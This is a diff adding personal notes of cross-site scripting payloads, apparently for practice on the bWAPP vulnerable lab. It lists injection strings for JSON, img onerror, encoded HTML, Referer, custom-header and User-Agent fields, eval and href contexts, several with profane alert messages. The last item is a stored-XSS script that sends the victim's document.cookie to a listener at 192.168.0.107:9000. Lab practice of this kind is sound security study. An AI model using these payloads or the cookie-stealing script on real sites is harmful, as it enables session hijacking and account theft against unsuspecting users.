@@ -1,0 +1,28 @@
+1) for json :
+<script>     var initData = {"foo":"</script><script>alert('XSS')</script>"}; </script>
+2)for ajax/json:
+<img src=x onerror=alert('fuckyou')>
+3)for ajax/xml:
+we need to encode the payload with html encoding..we encode the above payload using above payload..
+
+Output encoded/decoded text
+&lt;img src=x onerror=alert('skyfall')&gt;
+4)FOR back button use payload in referer header in burp:
+';alert("you are fucked");'
+
+5) custome http header xss:
+define the following payload below referer tag..
+bWAPP: <script>alert('hey')</script>
+6) user agent xss:
+iject following payload in user agent:
+<script>alert('hey')</script>
+7)exploiting eval:
+	inject following code in url:
+	alert(1)
+8)for HREF we use following payload:
+we need to firstly close previous > tag:
+><script>alert(1)</script>
+9)For stealing cookies in stored xss:
+<script type="text/javascript">
+document.location='http://192.168.0.107:9000?cookie='+document.cookie;
+</script>
